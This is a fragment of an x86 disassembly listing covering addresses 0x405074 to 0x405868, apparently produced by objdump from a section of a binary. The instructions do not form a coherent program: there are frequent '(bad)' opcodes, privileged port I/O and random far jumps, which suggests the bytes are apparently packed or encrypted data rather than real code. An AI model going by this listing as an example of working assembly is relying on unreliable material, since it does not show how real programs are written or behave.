  405074:	mov    edi,DWORD PTR [bx+di+0x23]
  405078:	xchg   esp,eax
  405079:	mov    bh,0xcd
  40507b:	jl     0x4050f3
  40507d:	popa   
  40507e:	inc    esp
  40507f:	jecxz  0x4050b7
  405081:	inc    ecx
  405082:	jb     0x405074
  405084:	imul   esi,edx,0xffffff9b
  405087:	fbstp  TBYTE PTR [ebx+0x26f28ddc]
  40508d:	mov    ch,0x92
  40508f:	mov    eax,0x25ef865d
  405094:	mov    eax,0xc71be0e2
  405099:	mov    ah,0x41
  40509b:	push   0xffffffbb
  40509d:	jae    0x4050c0
  40509f:	xchg   DWORD PTR [ecx],esp
  4050a1:	adc    dl,BYTE PTR [ebx-0x28]
  4050a4:	rol    DWORD PTR [edi],1
  4050a6:	ja     0x405121
  4050a8:	das    
  4050a9:	leave  
  4050aa:	push   eax
  4050ab:	es cdq 
  4050ad:	(bad)  
  4050af:	in     al,0x9
  4050b1:	mov    ecx,0x2418a94f
  4050b6:	sbb    ebx,ecx
  4050b8:	addr16 push ebx
  4050ba:	add    al,0x28
  4050bc:	jecxz  0x4050c7
  4050be:	push   edx
  4050bf:	pop    edi
  4050c0:	mov    ds:0xd8aae66f,al
  4050c5:	adc    esi,esi
  4050c7:	div    DWORD PTR [edi-0x5a]
  4050ca:	popa   
  4050cb:	mov    ds:0x30f276a4,eax
  4050d0:	lahf   
  4050d1:	push   ss
  4050d2:	pop    ebx
  4050d3:	cs fistp DWORD PTR gs:[esi+0x6fcca55c]
  4050db:	mov    ebx,0x4605d1f6
  4050e0:	pop    eax
  4050e1:	outs   dx,DWORD PTR ds:[esi]
  4050e2:	or     edi,edx
  4050e4:	jecxz  0x405087
  4050e6:	cmp    eax,0x43c593
  4050eb:	dec    eax
  4050ec:	cmp    esi,ebx
  4050ee:	push   eax
  4050ef:	ja     0x4050a6
  4050f1:	xor    al,0xa
  4050f3:	push   0x7f
  4050f5:	cmp    ecx,0xffffff86
  4050f8:	mov    edi,0x868cb12f
  4050fd:	fild   QWORD PTR [esi+0x2e]
  405100:	and    ch,bh
  405102:	inc    eax
  405103:	pop    edi
  405104:	ja     0x4050a1
  405106:	fmul   QWORD PTR [ebx-0x29]
  405109:	push   0x3d
  40510b:	scas   al,BYTE PTR es:[edi]
  40510c:	pop    ebp
  40510d:	push   edx
  40510e:	cmp    al,0xc8
  405110:	mov    cl,ah
  405112:	out    dx,al
  405113:	and    BYTE PTR [edi-0x3a],cl
  405116:	dec    ecx
  405117:	adc    al,0x5a
  405119:	sbb    bl,BYTE PTR [ebp-0x11]
  40511c:	or     DWORD PTR [edi+0x7e],edi
  40511f:	jo     0x40518b
  405121:	mov    ebx,ebp
  405123:	repnz out 0x93,eax
  405126:	sub    DWORD PTR [esi+eax*8-0x16091ffd],esp
  40512d:	push   0xffffffb7
  40512f:	les    eax,FWORD PTR [eax]
  405131:	aam    0xa4
  405133:	pusha  
  405134:	jno    0x4050d7
  405136:	mov    ds:0xb2d673e1,eax
  40513b:	jl     0x405178
  40513d:	iret   
  40513e:	jg     0x40514b
  405140:	ffreep st(1)
  405142:	xchg   ebx,eax
  405143:	(bad)  
  405145:	mov    ds:0x8a1f0736,al
  40514a:	div    dl
  40514c:	sub    dl,0x3e
  40514f:	cld    
  405150:	jle    0x405112
  405152:	or     BYTE PTR [eax-0x75],dh
  405155:	(bad)  
  405156:	mov    al,0x4a
  405158:	nop
  405159:	cwde   
  40515a:	add    DWORD PTR [ebp+eax*2-0x78868260],ebp
  405161:	add    al,0x19
  405163:	mov    al,ds:0xfeb890ae
  405168:	mov    WORD PTR [edi-0x74cb858c],ds
  40516e:	adc    esi,esp
  405170:	mov    edx,0x3cc97aa7
  405175:	xchg   ebp,eax
  405176:	call   0x510f4ce8
  40517b:	mov    eax,0xe3fc5c06
  405180:	push   ebx
  405181:	xchg   DWORD PTR [ebp+0x9231adc],esi
  405187:	inc    DWORD PTR [esi-0x3b]
  40518a:	add    BYTE PTR [esi+0x4],dh
  40518d:	fst    QWORD PTR [ebx+ebx*2]
  405190:	cmp    al,0x6b
  405192:	mov    edx,0x853ce4a0
  405197:	scas   eax,DWORD PTR es:[edi]
  405198:	rcr    DWORD PTR [eax+0x648f3923],cl
  40519e:	das    
  40519f:	jg     0x4051b6
  4051a1:	xchg   edx,eax
  4051a2:	gs pop es
  4051a4:	inc    edi
  4051a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051a6:	sbb    eax,0x28a04dc2
  4051ab:	pop    ebx
  4051ac:	mov    edx,0xd8312c11
  4051b1:	aad    0x9b
  4051b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051b4:	mov    ah,0xb3
  4051b6:	neg    eax
  4051b8:	xor    dl,bh
  4051ba:	sahf   
  4051bb:	jo     0x405221
  4051bd:	xchg   edi,eax
  4051be:	xor    DWORD PTR [ecx],ebx
  4051c0:	jmp    0x405214
  4051c2:	jo     0x405209
  4051c4:	mov    ebp,0xd4479066
  4051c9:	out    0xe8,eax
  4051cb:	dec    ecx
  4051cc:	loopne 0x405248
  4051ce:	xchg   ebx,eax
  4051cf:	sbb    DWORD PTR [ebp+0x0],0x55c6cfb2
  4051d6:	adc    bl,ch
  4051d8:	pop    ebp
  4051d9:	aad    0xce
  4051db:	pop    ebx
  4051dc:	in     eax,dx
  4051dd:	shr    BYTE PTR [ecx+0x58],0x73
  4051e1:	retf   0xf60e
  4051e4:	dec    esi
  4051e5:	mov    BYTE PTR [edi+0x32],ah
  4051e8:	loop   0x405193
  4051ea:	adc    esi,DWORD PTR [edi]
  4051ec:	cmp    DWORD PTR [edx-0x6d],ecx
  4051ef:	jl     0x405218
  4051f1:	inc    edx
  4051f2:	nop
  4051f3:	(bad)  
  4051f4:	loopne 0x4051c6
  4051f6:	xchg   esi,eax
  4051f7:	xchg   edx,eax
  4051f8:	les    edi,FWORD PTR [edi+eax*1-0x11482594]
  4051ff:	mov    eax,0xdf6b60d2
  405204:	mov    ch,0x2b
  405206:	xchg   edx,eax
  405207:	out    dx,eax
  405208:	fs xchg edx,eax
  40520a:	push   cs
  40520b:	jl     0x405229
  40520d:	popa   
  40520e:	mov    cl,0xc0
  405210:	sbb    edi,DWORD PTR [eax]
  405212:	out    0x46,eax
  405214:	pop    esp
  405215:	and    DWORD PTR [edi-0xd],0xe63acd42
  40521c:	scas   al,BYTE PTR es:[edi]
  40521d:	add    ah,BYTE PTR [ebx-0x35fb655f]
  405223:	arpl   di,bp
  405225:	popa   
  405226:	pop    es
  405227:	lock mov bl,0x3e
  40522a:	mov    cl,0xc4
  40522c:	setbe  BYTE PTR [ecx]
  40522f:	push   eax
  405230:	mov    esp,0xc5e6f424
  405235:	xchg   edx,eax
  405236:	inc    ebx
  405237:	mov    esp,0x7e160d69
  40523c:	test   BYTE PTR [edi+0x35fb81d4],0xed
  405243:	push   0xf202a725
  405248:	fucomi st,st(0)
  40524a:	push   ecx
  40524b:	push   0x58796b10
  405250:	adc    BYTE PTR [edi],al
  405252:	or     eax,0xb63ea764
  405257:	loop   0x4052ca
  405259:	pop    ebx
  40525a:	lahf   
  40525b:	xchg   esi,eax
  40525c:	push   cs
  40525d:	out    dx,eax
  40525e:	adc    eax,0x436a36fc
  405263:	xor    eax,0x9e3b0b5e
  405268:	sti    
  405269:	inc    edi
  40526a:	sub    BYTE PTR [eax+ebx*2+0x29],0xd
  40526f:	std    
  405270:	jecxz  0x4052e8
  405272:	dec    eax
  405273:	out    dx,eax
  405274:	push   cs
  405275:	pop    edx
  405276:	cmp    esi,DWORD PTR [eax+0x7a85213c]
  40527c:	xor    DWORD PTR [edi+0x5b1ad3b3],0xb07dcebb
  405286:	mov    al,0x23
  405288:	cmp    DWORD PTR [ebp+edi*1-0x19336662],esp
  40528f:	gs int 0xa8
  405292:	call   0xae9b5c0c
  405297:	xlat   BYTE PTR ds:[ebx]
  405298:	or     ecx,DWORD PTR [ebp-0x18d04173]
  40529e:	shl    BYTE PTR [edi+0x33d3b2ca],cl
  4052a4:	fnstcw WORD PTR [ecx]
  4052a6:	fwait
  4052a7:	in     al,dx
  4052a8:	das    
  4052a9:	(bad)  
  4052aa:	push   edx
  4052ab:	clc    
  4052ac:	(bad)  [ebp-0xb]
  4052af:	js     0x405243
  4052b1:	pop    eax
  4052b2:	clc    
  4052b3:	inc    ecx
  4052b4:	mov    bh,dl
  4052b6:	stos   BYTE PTR es:[edi],al
  4052b7:	mov    ebx,0x171bb999
  4052bc:	push   es
  4052bd:	mov    edx,0xae01db1e
  4052c2:	fidivr DWORD PTR [edi-0x125b7449]
  4052c8:	mov    edx,DWORD PTR [esi+0x1e]
  4052cb:	outs   dx,DWORD PTR ds:[esi]
  4052cc:	or     cl,BYTE PTR [esi+0xe]
  4052cf:	in     al,0xa3
  4052d1:	bound  edi,QWORD PTR [ebx-0x183e6b5b]
  4052d7:	adc    ecx,esi
  4052d9:	sbb    al,0x3e
  4052db:	dec    eax
  4052dc:	rcr    dh,1
  4052de:	push   ds
  4052df:	sbb    al,0x2
  4052e1:	mov    dh,0xb9
  4052e3:	mov    ah,0x15
  4052e5:	sub    eax,0x7fe9085e
  4052ea:	out    dx,al
  4052eb:	and    eax,0xda9e3cc3
  4052f0:	adc    ecx,DWORD PTR [esi-0x5cc5d634]
  4052f6:	fs dec ebx
  4052f8:	pop    ecx
  4052f9:	pusha  
  4052fa:	jp     0x40531c
  4052fc:	mov    ds:0xe95b138f,eax
  405301:	jnp    0x40530f
  405303:	xchg   esi,eax
  405304:	scas   al,BYTE PTR es:[edi]
  405305:	iret   
  405306:	mov    esi,0x9e823d9a
  40530b:	dec    esi
  40530c:	or     al,BYTE PTR [edx-0x3262868b]
  405312:	or     ebp,DWORD PTR [edx+esi*8-0x69]
  405316:	push   esp
  405317:	data16 (bad) 
  405319:	pop    ss
  40531a:	jmp    FWORD PTR [ebx]
  40531c:	rcl    BYTE PTR [edi-0x47],cl
  40531f:	scas   al,BYTE PTR es:[edi]
  405320:	bound  edi,QWORD PTR [ebp-0x42]
  405323:	test   eax,0xb4de12c6
  405328:	xor    bh,BYTE PTR [esi-0x27]
  40532b:	sbb    BYTE PTR [edx],cl
  40532d:	push   ss
  40532e:	add    DWORD PTR [esi+eax*1],esi
  405331:	call   0x1891:0x48f7393c
  405338:	push   ecx
  405339:	mov    cl,0x4e
  40533b:	out    0xf1,al
  40533d:	inc    ecx
  40533e:	fucomip st,st(5)
  405340:	pop    es
  405341:	or     ebp,DWORD PTR [ecx]
  405343:	push   edx
  405344:	sbb    edx,DWORD PTR ds:0xd2f2e3af
  40534a:	sub    al,0x4a
  40534c:	loope  0x4053c5
  40534e:	mov    eax,eax
  405350:	cmp    BYTE PTR [esi],dl
  405352:	ins    BYTE PTR es:[edi],dx
  405353:	pushf  
  405354:	mov    dl,bh
  405356:	gs cmp ah,cl
  405359:	jb     0x405303
  40535b:	mov    edi,0x8325500c
  405360:	jb     0x4052fc
  405362:	mov    al,ds:0xa15a4f5b
  405367:	jns    0x4053cd
  405369:	in     al,0x1f
  40536b:	mov    WORD PTR [ebp-0x30ffbc86],ds
  405371:	(bad)  
  405372:	jmp    0xac01:0x2212ce9c
  405379:	sahf   
  40537a:	ret    0xc5c8
  40537d:	retf   
  40537e:	or     BYTE PTR [ecx-0x1e],al
  405381:	repz cmp al,0x24
  405384:	jl     0x40534f
  405386:	mov    dh,0xef
  405388:	cwde   
  405389:	sbb    DWORD PTR [ecx],eax
  40538b:	fsub   QWORD PTR [eax+ecx*8]
  40538e:	movntq (bad),mm5
  40538f:	out    0xee,eax
  405391:	ja     0x40538a
  405393:	dec    esp
  405394:	rol    DWORD PTR [esi],1
  405396:	add    ah,BYTE PTR [eax+0x6a468778]
  40539c:	sbb    al,0x7f
  40539e:	xor    bl,BYTE PTR [edx-0x497de53f]
  4053a4:	imul   ebx,DWORD PTR [edx+0x1db94611],0xffffffd6
  4053ab:	pop    edx
  4053ac:	aam    0x7b
  4053ae:	je     0x405388
  4053b0:	or     DWORD PTR [edi-0x3c],0x5dd179a
  4053b7:	outs   dx,DWORD PTR ds:[esi]
  4053b8:	xchg   edi,eax
  4053b9:	jge    0x405417
  4053bb:	retf   0x7ec3
  4053be:	xor    dh,BYTE PTR [ecx+ecx*4+0x67]
  4053c2:	jmp    0x405358
  4053c4:	(bad)  
  4053c5:	jb     0x40542c
  4053c7:	loop   0x40542a
  4053c9:	xchg   DWORD PTR [ebp+0xb38f1af],esi
  4053cf:	ins    BYTE PTR es:[edi],dx
  4053d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053d1:	jns    0x4053fc
  4053d3:	enter  0x5931,0x39
  4053d7:	popf   
  4053d8:	inc    eax
  4053d9:	push   ebp
  4053da:	sbb    dh,BYTE PTR [ebx]
  4053dc:	int3   
  4053dd:	icebp  
  4053de:	les    ebx,FWORD PTR [esp+ecx*1]
  4053e1:	push   ebp
  4053e2:	mov    dl,0x52
  4053e4:	stos   BYTE PTR es:[edi],al
  4053e5:	xchg   ecx,eax
  4053e6:	imul   ecx,DWORD PTR [edi-0x7c97b884],0x78ad8abc
  4053f0:	(bad)  [eax]
  4053f2:	int    0xbb
  4053f4:	ss xchg edi,eax
  4053f6:	mov    al,ds:0xdefaa06c
  4053fb:	mov    ch,BYTE PTR [edx-0x667f058d]
  405401:	mov    edx,0x3d8657ff
  405406:	loop   0x405422
  405408:	inc    eax
  405409:	xchg   BYTE PTR [ebx-0x48],dh
  40540c:	in     eax,0x6e
  40540e:	push   ebx
  40540f:	into   
  405410:	push   cs
  405411:	retf   0xfc59
  405414:	and    ecx,DWORD PTR gs:[esi+0x40585989]
  40541b:	in     eax,0xab
  40541d:	sbb    DWORD PTR [eax+0xd0375fe],ecx
  405423:	lods   eax,DWORD PTR ds:[esi]
  405424:	fisub  WORD PTR [edi]
  405426:	mov    ecx,0xf46bed18
  40542b:	imul   ebp,DWORD PTR [esi+0x2c],0x5046ea65
  405432:	xor    al,0x6
  405434:	jb     0x4053e5
  405436:	jnp    0x4053ca
  405438:	push   edx
  405439:	enter  0x3ff,0x96
  40543d:	cld    
  40543e:	cmc    
  40543f:	out    0xdb,eax
  405441:	mov    dl,0xa5
  405443:	loopne 0x40542a
  405445:	int3   
  405446:	lahf   
  405447:	mov    edx,0x296e2e76
  40544c:	into   
  40544d:	cmp    al,0x2b
  40544f:	scas   al,BYTE PTR es:[edi]
  405450:	dec    edx
  405451:	(bad)  
  405452:	popf   
  405453:	cmp    dl,bh
  405455:	out    0x5e,al
  405457:	add    cl,BYTE PTR [ecx+0x6c3e0baa]
  40545d:	or     DWORD PTR [edx+0x57da14bc],0x4c
  405464:	sub    DWORD PTR [esi+ecx*2+0x6dcc2ad8],ebp
  40546b:	inc    edx
  40546c:	sbb    eax,0xac9594d4
  405471:	ret    
  405472:	add    al,0x65
  405474:	daa    
  405475:	mov    ebp,0xa5061f27
  40547a:	shl    dh,cl
  40547c:	xor    al,0x3
  40547e:	in     al,0x18
  405480:	test   eax,0x6135b6d8
  405485:	mov    esp,0x8500bffa
  40548a:	loop   0x405455
  40548c:	stc    
  40548d:	shr    DWORD PTR [esi],0x44
  405490:	lods   eax,DWORD PTR ds:[esi]
  405491:	inc    edi
  405492:	and    esi,esp
  405494:	pop    edi
  405495:	pop    ss
  405496:	daa    
  405497:	dec    ebx
  405498:	fcmove st,st(4)
  40549a:	adc    bh,BYTE PTR [ebp+0x2fb04983]
  4054a0:	inc    ebx
  4054a1:	and    al,BYTE PTR [edi]
  4054a3:	pop    ss
  4054a4:	int3   
  4054a5:	stos   DWORD PTR es:[edi],eax
  4054a6:	out    dx,al
  4054a7:	push   ebp
  4054a8:	dec    BYTE PTR [edi+0x54]
  4054ab:	mov    WORD PTR [edi+0x14],ss
  4054ae:	(bad)  
  4054af:	add    esp,esp
  4054b1:	xor    eax,0xf1bce933
  4054b6:	outs   dx,DWORD PTR ds:[esi]
  4054b7:	mov    edi,0x52ba438a
  4054bc:	push   edi
  4054bd:	jecxz  0x405466
  4054bf:	aam    0x70
  4054c1:	setno  BYTE PTR [edi+0x7b]
  4054c5:	cdq    
  4054c6:	sahf   
  4054c7:	pop    ecx
  4054c8:	js     0x40553a
  4054ca:	push   cs
  4054cb:	(bad)  
  4054cc:	pop    edx
  4054cd:	and    al,0xe
  4054cf:	xor    eax,0xf0785cd6
  4054d4:	in     al,0x23
  4054d6:	ds mov ah,0x98
  4054d9:	sbb    BYTE PTR [ecx-0x32],dh
  4054dc:	shl    esi,0x2a
  4054df:	retf   0xa049
  4054e2:	nop
  4054e3:	test   dl,ah
  4054e5:	dec    edi
  4054e6:	xor    BYTE PTR [ebp+0x772308f9],dl
  4054ec:	arpl   WORD PTR [edi+0x4],bp
  4054ef:	in     ax,0x1d
  4054f2:	inc    ecx
  4054f3:	and    ah,ch
  4054f5:	pop    ecx
  4054f6:	clc    
  4054f7:	pop    ecx
  4054f8:	cli    
  4054f9:	mov    dl,0x27
  4054fb:	sbb    eax,0x917d35fc
  405500:	js     0x4054a3
  405502:	mov    bl,0xea
  405504:	enter  0x7e6d,0x1a
  405508:	in     eax,0x7
  40550a:	leave  
  40550b:	inc    ebp
  40550c:	test   DWORD PTR [edx-0x73],edx
  40550f:	adc    ah,al
  405511:	loop   0x4054ab
  405513:	mov    eax,0x5dca35e3
  405518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405519:	(bad)  ds:0xa1bf1620
  40551f:	xchg   edi,eax
  405520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405521:	cmp    BYTE PTR [edx+0x4d],ah
  405524:	ds jl  0x40558e
  405527:	xor    eax,0x74e0f1a6
  40552c:	ins    BYTE PTR es:[edi],dx
  40552d:	adc    ebx,DWORD PTR [edi]
  40552f:	jne    0x4054d1
  405531:	jge    0x4055aa
  405533:	aam    0x2f
  405535:	push   ecx
  405536:	inc    edi
  405537:	jns    0x4055ae
  405539:	lods   eax,DWORD PTR ds:[esi]
  40553a:	mov    al,cl
  40553c:	mov    eax,0x347e21c4
  405541:	push   ss
  405542:	jg     0x40557f
  405544:	lods   eax,DWORD PTR ds:[si]
  405546:	or     al,BYTE PTR [ebp-0x63017be4]
  40554c:	ret    
  40554d:	retf   
  40554e:	pop    ecx
  40554f:	stos   DWORD PTR es:[edi],eax
  405550:	(bad)  
  405551:	in     eax,dx
  405552:	inc    esi
  405553:	add    BYTE PTR [esp+edx*4+0x6d],dl
  405557:	stos   BYTE PTR es:[edi],al
  405558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405559:	fcomp  QWORD PTR [eax+0x7120b52b]
  40555f:	mov    esi,0x32a48505
  405564:	outs   dx,DWORD PTR ds:[esi]
  405565:	inc    esi
  405566:	std    
  405567:	xchg   edi,eax
  405568:	pop    es
  405569:	fistp  WORD PTR [ecx-0x70be2424]
  40556f:	sub    edi,edx
  405571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405572:	pop    es
  405573:	mov    esi,0x137fd0ab
  405578:	rcr    DWORD PTR cs:[esi-0x587ec539],1
  40557f:	sbb    ebx,DWORD PTR [ebx+ecx*1-0x5990db3c]
  405586:	fmul   QWORD PTR ds:0x88b354b4
  40558c:	inc    ebp
  40558d:	mov    ds:0xd5f636de,eax
  405592:	fdivr  QWORD PTR [eax]
  405594:	sbb    al,BYTE PTR ss:[ebp+0x506a1a19]
  40559b:	xchg   edx,eax
  40559c:	stos   BYTE PTR es:[edi],al
  40559d:	and    BYTE PTR [ecx+0x26],bh
  4055a0:	dec    esi
  4055a1:	xchg   ah,al
  4055a3:	nop
  4055a4:	rcr    BYTE PTR [ebx+0x42dd5901],1
  4055aa:	das    
  4055ab:	fiadd  DWORD PTR ss:[eax]
  4055ae:	mov    ebp,0x8d15a733
  4055b3:	test   ebp,0x3972d6b5
  4055b9:	mov    ah,0xcd
  4055bb:	out    dx,eax
  4055bc:	add    bh,ah
  4055be:	ficom  WORD PTR [eax]
  4055c0:	mov    WORD PTR [ebp-0x306b6256],gs
  4055c6:	cmp    BYTE PTR [edx+edx*2+0x78],ah
  4055ca:	sbb    DWORD PTR [ecx+edi*1-0xf5081f1],0xbf5649cc
  4055d5:	fild   DWORD PTR [ebx]
  4055d7:	daa    
  4055d8:	add    DWORD PTR [edx+esi*1],edx
  4055db:	xlat   BYTE PTR ds:[ebx]
  4055dc:	mov    ds:0x194a6178,eax
  4055e1:	jnp    0x40561b
  4055e3:	mov    ecx,0x8d7f6e36
  4055e8:	add    dh,cl
  4055ea:	mov    edx,0xc6630c81
  4055ef:	lods   al,BYTE PTR ds:[esi]
  4055f0:	idiv   BYTE PTR [ecx]
  4055f2:	xchg   ebx,eax
  4055f3:	ret    
  4055f4:	jae    0x40561a
  4055f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055f7:	sub    esi,ebx
  4055f9:	jns    0x4055a6
  4055fb:	lds    ebx,FWORD PTR [ecx+eax*4]
  4055fe:	push   edi
  4055ff:	nop
  405600:	cs jle 0x405615
  405603:	pop    ss
  405604:	fimul  DWORD PTR [esi+edx*2-0x5a]
  405608:	repz pop ebx
  40560a:	adc    DWORD PTR [edi-0xeb54c3e],ebp
  405610:	mov    BYTE PTR [edx-0x4226073],cl
  405616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405617:	call   0xdf20161a
  40561c:	mov    ch,0xf0
  40561e:	into   
  40561f:	cdq    
  405620:	call   0x9677d3cd
  405625:	and    dh,ch
  405627:	sub    DWORD PTR [esi-0x1f],0x2b
  40562b:	(bad)  
  40562c:	mov    al,ds:0x4c19667
  405631:	push   0xffffffc2
  405633:	jge    0x40568f
  405635:	mov    dh,BYTE PTR [ebx]
  405637:	jmp    0x40566b
  405639:	pop    ss
  40563a:	mov    DWORD PTR [ebx+0x69bd894d],ebp
  405640:	out    0x53,al
  405642:	fbstp  TBYTE PTR [ecx+0x4]
  405645:	push   edx
  405646:	dec    edx
  405647:	and    esi,DWORD PTR [ebx+edi*2+0x49a480c0]
  40564e:	stc    
  40564f:	rcr    BYTE PTR [edi+0x14],1
  405652:	in     al,0xf1
  405654:	sub    DWORD PTR [esi-0x6f],ecx
  405657:	jnp    0x405671
  405659:	mov    bh,0x38
  40565b:	ret    
  40565c:	add    cl,al
  40565e:	sbb    DWORD PTR [ebx-0x23],edx
  405661:	cmp    edi,DWORD PTR ds:0x501ac5a9
  405667:	jo     0x4056cd
  405669:	inc    ebp
  40566a:	jb     0x405659
  40566c:	add    eax,0x99d053bd
  405671:	jns    0x405630
  405673:	gs push ss
  405675:	in     al,0xbe
  405677:	loopne 0x4056d6
  405679:	ror    DWORD PTR [esi+0x9],0x1b
  40567d:	xor    ebx,edi
  40567f:	shl    DWORD PTR [ebp-0x66cca18f],1
  405685:	neg    dh
  405687:	push   esp
  405688:	jp     0x4056d7
  40568a:	rol    DWORD PTR [ebx+0x6ce6ba41],1
  405690:	pop    ebx
  405691:	sbb    al,0x28
  405693:	daa    
  405694:	jb     0x4056dd
  405696:	jp     0x405684
  405698:	aam    0x39
  40569a:	out    dx,al
  40569b:	add    eax,0xa6da213
  4056a0:	pop    edi
  4056a1:	call   0x42b8:0xd9dd9989
  4056a8:	(bad)  
  4056a9:	aas    
  4056aa:	mov    bh,0x64
  4056ac:	xor    esi,DWORD PTR [ebp+0x474c1126]
  4056b2:	mov    eax,0x205c62b
  4056b7:	or     DWORD PTR [edi],0xe
  4056ba:	jae    0x405692
  4056bc:	sub    eax,0x2fc282b7
  4056c1:	mov    ebp,0xdc9ff746
  4056c6:	jecxz  0x4056db
  4056c8:	std    
  4056c9:	add    DWORD PTR [esp+eax*4+0x3f],ebx
  4056cd:	pop    es
  4056ce:	in     eax,0x51
  4056d0:	pusha  
  4056d1:	adc    dl,BYTE PTR [ebp-0xdf317aa]
  4056d7:	jmp    0xd2b23146
  4056dc:	xchg   edi,eax
  4056dd:	sub    bh,BYTE PTR [esi-0xe]
  4056e0:	inc    esp
  4056e1:	add    al,0x63
  4056e3:	mov    dh,0xc
  4056e5:	popf   
  4056e6:	mov    edx,0xe9aa92b8
  4056eb:	fcmovbe st,st(4)
  4056ed:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ef:	cmp    eax,DWORD PTR [eax+0x52]
  4056f2:	aam    0x34
  4056f4:	out    0x7,eax
  4056f6:	mov    ah,0xde
  4056f8:	xor    eax,0xcc33fab4
  4056fd:	sub    ah,BYTE PTR [ebp+0x45a77bae]
  405703:	fimul  DWORD PTR [edi]
  405705:	push   esi
  405706:	add    al,0x27
  405708:	mov    edx,0xe8746f15
  40570d:	xlat   BYTE PTR ds:[ebx]
  40570e:	cmp    BYTE PTR [ebx+0x6320d3b],ch
  405714:	out    0xdd,al
  405716:	cwde   
  405717:	sti    
  405718:	pop    ecx
  405719:	(bad)  
  40571a:	jns    0x40578c
  40571c:	imul   ebp,DWORD PTR [ecx+0x43],0x1b1d24c8
  405723:	test   al,0xe1
  405725:	jg     0x40574d
  405727:	out    0xd6,eax
  405729:	or     eax,0xc1b627c3
  40572e:	ror    BYTE PTR [edx-0x4a2d16cf],0x9d
  405735:	push   eax
  405736:	mov    bl,0x94
  405738:	sub    ch,BYTE PTR [edx+0x4e46dc42]
  40573e:	jle    0x405717
  405740:	pop    ecx
  405741:	adc    dl,BYTE PTR [edi+0x43]
  405744:	loope  0x4056f4
  405746:	(bad)  
  405747:	sahf   
  405748:	jno    0x405755
  40574a:	pop    edx
  40574b:	sbb    al,0xf2
  40574d:	mov    dh,0xb8
  40574f:	(bad)  
  405750:	popf   
  405751:	cmp    DWORD PTR [ecx+0x6cf1fe22],0xffffffef
  405758:	fild   WORD PTR [edi-0x1a]
  40575b:	in     eax,dx
  40575c:	cmp    DWORD PTR [edi-0x45],ebx
  40575f:	je     0x40572f
  405761:	rcr    BYTE PTR [edx+0x3b],cl
  405764:	sub    al,0xfc
  405766:	cld    
  405767:	in     eax,dx
  405768:	ret    0xc338
  40576b:	dec    ecx
  40576c:	jmp    0x1c45:0xff67127c
  405773:	fld    st(6)
  405775:	test   BYTE PTR [bp+0x57ea],bl
  40577a:	dec    BYTE PTR [edx]
  40577c:	push   es
  40577d:	and    al,BYTE PTR [ebp-0x7beb685]
  405783:	xchg   DWORD PTR [ecx],edi
  405785:	fwait
  405786:	mov    eax,0xa1d0b5c
  40578b:	cwde   
  40578c:	(bad)  
  40578d:	test   al,0xa1
  40578f:	cmp    BYTE PTR [esp+edi*4+0x44],bh
  405793:	inc    eax
  405794:	cmp    dh,bl
  405796:	lds    eax,FWORD PTR ss:[esi-0x5f]
  40579a:	test   eax,0xe1340ed3
  40579f:	pop    ds
  4057a0:	mov    ebp,0x77194b67
  4057a5:	addr16 in al,0x6b
  4057a8:	pop    ecx
  4057a9:	add    ch,BYTE PTR ds:0xfea5afd9
  4057af:	jns    0x4057f5
  4057b1:	(bad)
  4057b5:	jg     0x40577c
  4057b7:	inc    ebp
  4057b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057b9:	push   0xde7a68b3
  4057be:	sub    BYTE PTR [esi*2-0x49657ae0],cl
  4057c5:	jecxz  0x40583b
  4057c7:	sub    eax,DWORD PTR [edi+eiz*4]
  4057ca:	jae    0x405821
  4057cc:	add    eax,0x9b8ce64d
  4057d1:	dec    eax
  4057d2:	inc    DWORD PTR [ecx]
  4057d4:	adc    eax,0x46a775b4
  4057d9:	out    0x8c,eax
  4057db:	inc    esi
  4057dc:	in     al,dx
  4057dd:	fsub   DWORD PTR [eax]
  4057df:	xor    ah,BYTE PTR [edi+0x40]
  4057e2:	xor    DWORD PTR ds:[edx],esp
  4057e5:	jecxz  0x4057c9
  4057e7:	mov    bl,0x1e
  4057e9:	ds cdq 
  4057eb:	or     al,0xf7
  4057ed:	mov    bh,0xa4
  4057ef:	push   0xffffffa4
  4057f1:	jno    0x405821
  4057f3:	xor    BYTE PTR [eax-0x3a579e1b],al
  4057f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057fa:	jne    0x4057fc
  4057fc:	sbb    DWORD PTR [ecx],edi
  4057fe:	xor    BYTE PTR ds:0x6733518b,bh
  405804:	inc    ecx
  405805:	pop    edi
  405806:	xor    ebp,DWORD PTR [edx-0x43]
  405809:	mov    esi,ds
  40580b:	mov    edi,0x87b03af2
  405810:	sub    BYTE PTR [esi],dl
  405812:	call   0xd58063fa
  405817:	inc    edx
  405818:	xchg   esp,eax
  405819:	push   cs
  40581a:	hlt    
  40581b:	jbe    0x405860
  40581d:	rcr    eax,0x6d
  405820:	loop   0x40582b
  405822:	scas   al,BYTE PTR es:[edi]
  405823:	mov    ebx,0xb343c54a
  405828:	ds mov eax,0x350c8f46
  40582e:	fstp   QWORD PTR [eax-0x43]
  405831:	ins    BYTE PTR es:[edi],dx
  405832:	fild   DWORD PTR [eax-0xf]
  405835:	xchg   BYTE PTR [edi],ch
  405837:	cmp    DWORD PTR [ebx+0x2385f0d3],ebx
  40583d:	push   0xffffffea
  40583f:	and    DWORD PTR [eax+0x28],ebx
  405842:	xchg   DWORD PTR [edx+0x38],esi
  405845:	fmul   st(0),st
  405847:	repnz push 0x505c3d40
  40584d:	test   BYTE PTR [ecx+eax*8-0x53],ch
  405851:	sahf   
  405852:	and    al,0x3
  405854:	sbb    BYTE PTR [edx+0x233b2726],bh
  40585a:	add    DWORD PTR [eax],edx
  40585c:	xor    ah,0x87
  40585f:	stc    
  405860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405861:	into   
  405862:	stos   DWORD PTR es:[edi],eax
  405863:	push   cs
  405864:	shl    DWORD PTR [ecx],0xd5
  405867:	sahf   
  405868:	jbe    0x405843
